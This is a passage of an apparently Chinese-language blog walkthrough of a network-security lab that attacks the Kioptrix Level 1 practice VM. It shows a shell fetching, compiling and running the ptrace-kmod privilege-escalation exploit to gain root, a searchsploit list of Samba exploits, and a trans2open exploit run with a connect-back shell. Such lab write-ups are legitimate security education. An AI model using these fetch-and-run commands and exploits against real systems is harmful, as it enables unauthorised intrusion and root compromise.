+</span><span id="__span-6-10">*<span class="w"> </span><span class="c1">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span>
+</span><span id="__span-6-11">*******************************************************************
+</span><span id="__span-6-12">
+</span><span id="__span-6-13">Connection...<span class="w"> </span><span class="m">40</span><span class="w"> </span>of<span class="w"> </span><span class="m">40</span>
+</span><span id="__span-6-14">Establishing<span class="w"> </span>SSL<span class="w"> </span>connection
+</span><span id="__span-6-15">cipher:<span class="w"> </span>0x4043808c<span class="w">   </span>ciphers:<span class="w"> </span>0x80f81c8
+</span><span id="__span-6-16">Ready<span class="w"> </span>to<span class="w"> </span>send<span class="w"> </span>shellcode
+</span><span id="__span-6-17">Spawning<span class="w"> </span>shell...
+</span><span id="__span-6-18">bash:<span class="w"> </span>no<span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>shell
+</span><span id="__span-6-19">bash-2.05$<span class="w"> </span>
+</span><span id="__span-6-20">d.c<span class="p">;</span><span class="w"> </span>./exploit<span class="p">;</span><span class="w"> </span>-kmod.c<span class="p">;</span><span class="w"> </span>gcc<span class="w"> </span>-o<span class="w"> </span>exploit<span class="w"> </span>ptrace-kmod.c<span class="w"> </span>-B<span class="w"> </span>/usr/bin<span class="p">;</span><span class="w"> </span>rm<span class="w"> </span>ptrace-kmo<span class="w"> </span>
+</span><span id="__span-6-21">--15:37:48--<span class="w">  </span>https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+</span><span id="__span-6-22"><span class="w">           </span><span class="o">=</span>&gt;<span class="w"> </span><span class="sb">`</span>ptrace-kmod.c<span class="s1">'</span>
+</span><span id="__span-6-23"><span class="s1">Connecting to dl.packetstormsecurity.net:443... </span>
+</span><span id="__span-6-24"><span class="s1">dl.packetstormsecurity.net: Host not found.</span>
+</span><span id="__span-6-25"><span class="s1">gcc: ptrace-kmod.c: No such file or directory</span>
+</span><span id="__span-6-26"><span class="s1">gcc: No input files</span>
+</span><span id="__span-6-27"><span class="s1">rm: cannot remove `ptrace-kmod.c'</span>:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory
+</span><span id="__span-6-28">bash:<span class="w"> </span>./exploit:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory
+</span><span id="__span-6-29">bash-2.05$<span class="w"> </span>id<span class="w">  </span>
+</span><span id="__span-6-30"><span class="nv">uid</span><span class="o">=</span><span class="m">48</span><span class="o">(</span>apache<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">48</span><span class="o">(</span>apache<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">48</span><span class="o">(</span>apache<span class="o">)</span>
+</span></code></pre></div>
+<p>似乎成功了，但是提权失败了。注意到似乎运行了一个脚本，那我们在本机下好然后直接写进去进行提权，就成功了。</p>
+<div class="highlight"><pre><span></span><code><span id="__span-7-1">bash-2.05$<span class="w"> </span>vi<span class="w"> </span>ptrace-kmod.c
+</span><span id="__span-7-2">bash-2.05$<span class="w"> </span>gcc<span class="w"> </span>ptrace-kmod.c
+</span><span id="__span-7-3">bash-2.05$<span class="w"> </span>./a.out
+</span><span id="__span-7-4"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Attached<span class="w"> </span>to<span class="w"> </span><span class="m">6256</span>
+</span><span id="__span-7-5"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Waiting<span class="w"> </span><span class="k">for</span><span class="w"> </span>signal
+</span><span id="__span-7-6"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Signal<span class="w"> </span>caught
+</span><span id="__span-7-7"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Shellcode<span class="w"> </span>placed<span class="w"> </span>at<span class="w"> </span>0x4001189d
+</span><span id="__span-7-8"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Now<span class="w"> </span><span class="nb">wait</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>suid<span class="w"> </span>shell...
+</span><span id="__span-7-9">id<span class="w"> </span>
+</span><span id="__span-7-10"><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>bin<span class="o">)</span>,2<span class="o">(</span>daemon<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,10<span class="o">(</span>wheel<span class="o">)</span>
+</span></code></pre></div>
+<h2 id="通过-samba-进行攻击">通过 Samba 进行攻击<a class="headerlink" href="#通过-samba-进行攻击" title="Permanent link">¶</a></h2>
+<p>接下来我们试一下 Samba 能不能进行攻击。由于我们不知道他的版本，可以随便试一下</p>
+<div class="admonition tip">
+<p class="admonition-title">好像也可以通过 Apache 的版本来通过日期推断 Samba 的版本</p>
+</div>
+<div class="highlight"><pre><span></span><code><span id="__span-8-1">$ searchsploit Samba
+</span><span id="__span-8-2">shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+</span><span id="__span-8-3">chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+</span><span id="__span-8-4">------------------------------------------------- ---------------------------------
+</span><span id="__span-8-5"> Exploit Title                                   |  Path
+</span><span id="__span-8-6">------------------------------------------------- ---------------------------------
+</span><span id="__span-8-7">GoSamba 1.0.1 - 'INCLUDE_PATH' Multiple Remote F | php/webapps/4575.txt
+</span><span id="__span-8-8">Microsoft Windows XP/2003 - Samba Share Resource | windows/dos/148.sh
+</span><span id="__span-8-9">Samba 1.9.19 - 'Password' Remote Buffer Overflow | linux/remote/20308.c
+</span><span id="__span-8-10">Samba &lt; 2.0.5 - Local Overflow                   | linux/local/19428.c
+</span><span id="__span-8-11">Samba 2.0.7 - SWAT Logfile Permissions           | linux/local/20341.sh
+</span><span id="__span-8-12">Samba 2.0.7 - SWAT Logging Failure               | unix/remote/20340.c
+</span><span id="__span-8-13">Samba 2.0.7 - SWAT Symlink (1)                   | linux/local/20338.c
+</span><span id="__span-8-14">Samba 2.0.7 - SWAT Symlink (2)                   | linux/local/20339.sh
+</span><span id="__span-8-15">Samba 2.0.x/2.2 - Arbitrary File Creation        | unix/remote/20968.txt
+</span><span id="__span-8-16">Samba 2.0.x - Insecure TMP File Symbolic Link    | linux/local/20776.c
+</span><span id="__span-8-17">Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow  | osx/remote/9924.rb
+</span><span id="__span-8-18">Samba 2.2.2 &lt; 2.2.6 - 'nttrans' Remote Buffer Ov | linux/remote/16321.rb
+</span><span id="__span-8-19">Samba 2.2.8 - Brute Force Method Remote Command  | linux/remote/55.c
+</span><span id="__span-8-20">Samba 2.2.8 (BSD x86) - 'trans2open' Remote Over | bsd_x86/remote/16880.rb
+</span><span id="__span-8-21">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Executio | multiple/remote/10.c
+</span><span id="__span-8-22">Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrak | linux/local/23674.txt
+</span><span id="__span-8-23">Samba 2.2.8 (Linux x86) - 'trans2open' Remote Ov | linux_x86/remote/16861.rb
+</span><span id="__span-8-24">Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Over | osx_ppc/remote/16876.rb
+</span><span id="__span-8-25">Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remot | solaris_sparc/remote/16330.rb
+</span><span id="__span-8-26">Samba 2.2.x - 'call_trans2open' Remote Buffer Ov | unix/remote/22468.c
+</span><span id="__span-8-27">Samba 2.2.x - 'call_trans2open' Remote Buffer Ov | unix/remote/22469.c
+</span><span id="__span-8-28">Samba 2.2.x - 'call_trans2open' Remote Buffer Ov | unix/remote/22470.c
+</span><span id="__span-8-29">Samba 2.2.x - 'call_trans2open' Remote Buffer Ov | unix/remote/22471.txt
+</span><span id="__span-8-30">Samba 2.2.x - CIFS/9000 Server A.01.x Packet Ass | unix/remote/22356.c
+</span><span id="__span-8-31">Samba 2.2.x - 'nttrans' Remote Overflow (Metaspl | linux/remote/9936.rb
+</span><span id="__span-8-32">Samba 2.2.x - Remote Buffer Overflow             | linux/remote/7.pl
+</span><span id="__span-8-33">Samba 3.0.10 &lt; 3.3.5 - Format String / Security  | multiple/remote/10095.txt
+</span><span id="__span-8-34">Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap O | osx/remote/16875.rb
+</span><span id="__span-8-35">Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script | unix/remote/16320.rb
+</span><span id="__span-8-36">Samba &lt; 3.0.20 - Remote Heap Overflow            | linux/remote/7701.txt
+</span><span id="__span-8-37">Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Ove | linux/remote/9950.rb
+</span><span id="__span-8-38">Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap | linux/remote/16859.rb
+</span><span id="__span-8-39">Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' He | solaris/remote/16329.rb
+</span><span id="__span-8-40">Samba 3.0.27a - 'send_mailslot()' Remote Buffer  | linux/dos/4732.c
+</span><span id="__span-8-41">Samba 3.0.29 (Client) - 'receive_smb_raw()' Buff | multiple/dos/5712.pl
+</span><span id="__span-8-42">Samba 3.0.4 - SWAT Authorisation Buffer Overflow | linux/remote/364.pl
+</span><span id="__span-8-43">Samba 3.3.12 (Linux x86) - 'chain_reply' Memory  | linux_x86/remote/16860.rb
+</span><span id="__span-8-44">Samba 3.3.5 - Format String / Security Bypass    | linux/remote/33053.txt
+</span><span id="__span-8-45">Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy | linux/remote/21850.rb
+</span><span id="__span-8-46">Samba 3.4.5 - Symlink Directory Traversal        | linux/remote/33599.txt
+</span><span id="__span-8-47">Samba 3.4.5 - Symlink Directory Traversal (Metas | linux/remote/33598.rb
+</span><span id="__span-8-48">Samba 3.4.7/3.5.1 - Denial of Service            | linux/dos/12588.txt
+</span><span id="__span-8-49">Samba 3.5.0 &lt; 4.4.14/4.5.10/4.6.4 - 'is_known_pi | linux/remote/42084.rb
+</span><span id="__span-8-50">Samba 3.5.0 - Remote Code Execution              | linux/remote/42060.py
+</span><span id="__span-8-51">Samba 3.5.11/3.6.3 - Remote Code Execution       | linux/remote/37834.py
+</span><span id="__span-8-52">Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Intege | linux/dos/27778.txt
+</span><span id="__span-8-53">Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)    | linux_x86/dos/36741.py
+</span><span id="__span-8-54">Samba 4.5.2 - Symlink Race Permits Opening Files | multiple/remote/41740.txt
+</span><span id="__span-8-55">Sambar FTP Server 6.4 - 'SIZE' Remote Denial of  | windows/dos/2934.php
+</span><span id="__span-8-56">Sambar Server 4.1 Beta - Admin Access            | cgi/remote/20570.txt
+</span><span id="__span-8-57">Sambar Server 4.2 Beta 7 - Batch CGI             | windows/remote/19761.txt
+</span><span id="__span-8-58">Sambar Server 4.3/4.4 Beta 3 - Search CGI        | windows/remote/20223.txt
+</span><span id="__span-8-59">Sambar Server 4.4/5.0 - 'pagecount' File Overwri | multiple/remote/21026.txt
+</span><span id="__span-8-60">Sambar Server 4.x/5.0 - Insecure Default Passwor | multiple/remote/21027.txt
+</span><span id="__span-8-61">Sambar Server 5.1 - Sample Script Denial of Serv | windows/dos/21228.c
+</span><span id="__span-8-62">Sambar Server 5.1 - Script Source Disclosure     | cgi/remote/21390.txt
+</span><span id="__span-8-63">Sambar Server 5.x/6.0/6.1 - logout RCredirect Cr | windows/remote/25695.txt
+</span><span id="__span-8-64">Sambar Server 5.x/6.0/6.1 - 'results.stm' indexn | windows/remote/25694.txt
+</span><span id="__span-8-65">Sambar Server 5.x/6.0/6.1 - Server Referer Cross | windows/remote/25696.txt
+</span><span id="__span-8-66">Sambar Server 5.x - Information Disclosure       | windows/remote/22434.txt
+</span><span id="__span-8-67">Sambar Server 5.x - Open Proxy / Authentication  | windows/remote/24076.txt
+</span><span id="__span-8-68">Sambar Server 5.x - 'results.stm' Cross-Site Scr | windows/remote/22185.txt
+</span><span id="__span-8-69">Sambar Server 6.0 - 'results.stm' POST Buffer Ov | windows/dos/23664.py
+</span><span id="__span-8-70">Sambar Server 6.1 Beta 2 - 'show.asp?show' Cross | windows/remote/24161.txt
+</span><span id="__span-8-71">Sambar Server 6.1 Beta 2 - 'showini.asp' Arbitra | windows/remote/24163.txt
+</span><span id="__span-8-72">Sambar Server 6.1 Beta 2 - 'showperf.asp?title'  | windows/remote/24162.txt
+</span><span id="__span-8-73">Sambar Server 6 - Search Results Buffer Overflow | windows/remote/16756.rb
+</span><span id="__span-8-74">SWAT Samba Web Administration Tool - Cross-Site  | cgi/webapps/17577.txt
+</span><span id="__span-8-75">------------------------------------------------- ---------------------------------
+</span><span id="__span-8-76">Shellcodes: No Results
+</span></code></pre></div>
+<p>大胆尝试一下 remote 的 C 脚本，顺着试一下，从下往上试，这样覆盖的版本应该广一点</p>
+<p>尝试一下 22356 并修改一下使其编译通过</p>
+<div class="admonition info">
+<p class="admonition-title">似乎有很多脚本都没法直接运行，一般是在不应该换行的地方换行了，或者标准太老了，稍微改改就行</p>
+</div>
+<div class="highlight"><pre><span></span><code><span id="__span-9-1">$ searchsploit -m 22356
+</span><span id="__span-9-2">  Exploit: Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow
+</span><span id="__span-9-3">      URL: https://www.exploit-db.com/exploits/22356
+</span><span id="__span-9-4">     Path: /usr/share/exploitdb/exploits/unix/remote/22356.c
+</span><span id="__span-9-5">    Codes: CVE-2003-0085, OSVDB-6323
+</span><span id="__span-9-6"> Verified: True
+</span><span id="__span-9-7">File Type: C source, ASCII text
+</span><span id="__span-9-8">Copied to: /home/sprite/net-lab/lab3/assets/samba/22356.c
+</span><span id="__span-9-9">$ gcc 22356.c
+</span><span id="__span-9-10">$ ./a.out
+</span></code></pre></div>
+<p>失败了。再接着往上换 22470，仍然需要修改一下使其编译通过</p>
+<div class="highlight"><pre><span></span><code><span id="__span-10-1">$ searchsploit -m 22470
+</span><span id="__span-10-2">  Exploit: Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)
+</span><span id="__span-10-3">      URL: https://www.exploit-db.com/exploits/22470
+</span><span id="__span-10-4">     Path: /usr/share/exploitdb/exploits/unix/remote/22470.c
+</span><span id="__span-10-5">    Codes: CVE-2003-0201, OSVDB-4469
+</span><span id="__span-10-6"> Verified: True
+</span><span id="__span-10-7">File Type: C source, ASCII text
+</span><span id="__span-10-8">Copied to: /home/sprite/net-lab/lab3/assets/samba/22470.c
+</span><span id="__span-10-9">$ gcc 22470.c 
+</span><span id="__span-10-10">$ ./a.out
+</span><span id="__span-10-11">Samba &lt; 2.2.8 Remote Root exploit by Schizoprenic
+</span><span id="__span-10-12">Connect back method, Xnuxer-Labs, 2003.
+</span><span id="__span-10-13">Usage  : ./a.out &lt;type&gt; &lt;victim&gt; &lt;your_ip&gt;
+</span><span id="__span-10-14">Targets:
+</span><span id="__span-10-15">         0 = Linux
+</span><span id="__span-10-16">         1 = FreeBSD/NetBSD
+</span><span id="__span-10-17">         2 = OpenBSD 3.0 and prior
+</span><span id="__span-10-18">         3 = OpenBSD 3.2 - non-exec stack
+</span><span id="__span-10-19">
+</span><span id="__span-10-20">$ ./a.out 0 192.168.56.2 192.168.56.1
+</span><span id="__span-10-21">[+] Listen on port: 45295
+</span><span id="__span-10-22">[+] Connecting back to: [192.168.56.1:45295]
+</span><span id="__span-10-23">[+] Target: Linux
+</span><span id="__span-10-24">[+] Connected to [192.168.56.2:139]
+</span><span id="__span-10-25">[+] Please wait in seconds...!
+</span><span id="__span-10-26">[+] Yeah, I have a root ....!
+</span><span id="__span-10-27">------------------------------
+</span><span id="__span-10-28">Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+</span><span id="__span-10-29">uid=0(root) gid=0(root) groups=99(nobody)
+</span><span id="__span-10-30">id
+</span><span id="__span-10-31">uid=0(root) gid=0(root) groups=99(nobody)
+</span></code></pre></div>
+<p>那么就成功了，还算是比较顺利。</p>
+<h2 id="总结">总结<a class="headerlink" href="#总结" title="Permanent link">¶</a></h2>
+<p>可以看到总的来说还是比较顺利的。感觉对于比较老的靶机，漏洞应该挺多的，所以用 searchsploit 试一试就能拿到 root 了。</p>
+<p>nmap 没有获取 Samba 的版本号，不过由于 searchsploit 出来的脚本不多，可以挨个试一试。感觉实际上还是先通过其他程序的版本来确定年份，再通过年份推断程序的版本可能更合适。</p>
+<p>另外，我把靶机给 ds，他居然三分钟不到就秒了。哎</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+  <h2 id="__comments">Comments</h2>
+  <!-- Insert generated snippet here -->
+  <script src="https://giscus.app/client.js" data-repo="simonzxm/giscus" data-repo-id="R_kgDOQvtcKQ" data-category="Announcements" data-category-id="DIC_kwDOQvtcKc4C0Sa-" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="en" crossorigin="anonymous" async="">
+  </script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate"
+        ? "transparent_dark"
+        : "light"
+
+      // Instruct Giscus to set theme
+      giscus.setAttribute("data-theme", theme) 
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+          // Instruct Giscus to change theme
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+        
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer">
+        
+          
+          <a href="../using-esim-on-pc/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Using eSIM on PC">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Using eSIM on PC
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../nju-net-lab-2-walkthrough/" class="md-footer__link md-footer__link--next" aria-label="Next: NJU Net Lab 2 Walkthrough">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                NJU Net Lab 2 Walkthrough
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"></path></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright © 2025-2026 XM Zheng
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy", "navigation.tabs", "navigation.tabs.sticky", "navigation.expand", "navigation.footer", "search.suggest", "search.highlight", "toc.integrate"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../assets/_markdown_exec_pyodide.js"></script>
+      
+        <script src="../../javascripts/mathjax.js"></script>
+      
+        <script src="../../javascripts/busuanzi.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
